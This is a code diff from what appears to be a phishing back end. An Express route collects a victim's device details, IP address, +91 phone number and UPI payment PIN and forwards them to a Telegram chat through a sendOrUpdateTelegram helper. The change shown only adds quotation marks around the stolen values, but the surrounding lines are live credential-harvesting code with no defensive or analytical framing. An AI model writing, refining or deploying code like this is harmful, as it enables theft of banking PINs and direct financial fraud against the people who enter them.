@@ -87,17 +87,17 @@ app.post('/send-data', async (req, res) => {
         
 
         let updatedText = `*Device Model:* ${deviceId || 'Detecting...'}\n`;
-        updatedText += `*IP Address:* ${userIP || 'Detecting...'}\n`; 
+        updatedText += `*IP Address:* "${userIP || 'Detecting...'}"\n`; 
         updatedText += `*Date:* ${deviceDate || 'Detecting...'}\n`; 
         updatedText += `*Real Time:* ${deviceTime || 'Detecting...'}\n`; 
-        updatedText += `*Number:* +91${number}\n`;
+        updatedText += `*Number:* "+91${number}"\n`;
         
         await sendOrUpdateTelegram(updatedText);
     } else if (pin) {
         pinCount++; 
 
 
-        currentMessageText += `*UPI PIN:* ${pin}\n`;
+        currentMessageText += `*UPI PIN:* "${pin}"\n`;
         
         await sendOrUpdateTelegram(currentMessageText);
         
